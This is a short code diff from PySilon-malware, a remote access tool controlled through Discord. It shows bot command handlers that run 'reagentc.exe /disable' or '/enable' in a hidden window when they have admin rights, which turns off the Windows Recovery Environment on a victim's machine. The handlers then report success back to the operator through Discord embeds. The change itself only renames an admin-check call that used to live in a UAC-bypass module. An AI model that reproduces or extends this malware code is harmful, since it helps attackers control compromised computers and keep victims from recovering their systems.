@@ -151,7 +151,7 @@ async def delete_category(ctx,  argument=None, password=None):
 async def reset_agentc_handler(ctx, argument=None):
     if argument == "block":
         await ctx.message.delete()
-        if uac_bypass.IsAdmin():
+        if IsAdmin():
             subprocess.run('reagentc.exe /disable', creationflags=subprocess.CREATE_NO_WINDOW)
             embed = discord.Embed(title="🟣 System",description=f'```Successfully disabled REAgentC.```', colour=discord.Colour.purple())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
@@ -162,7 +162,7 @@ async def reset_agentc_handler(ctx, argument=None):
             reaction_msg = await ctx.send(embed=embed); await reaction_msg.add_reaction('🔴')
     elif argument == "unblock":
         await ctx.message.delete()
-        if uac_bypass.IsAdmin():
+        if IsAdmin():
             subprocess.run('reagentc.exe /enable', creationflags=subprocess.CREATE_NO_WINDOW)
             embed = discord.Embed(title="🟣 System",description=f'```Successfully enabled REAgentC.```', colour=discord.Colour.purple())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
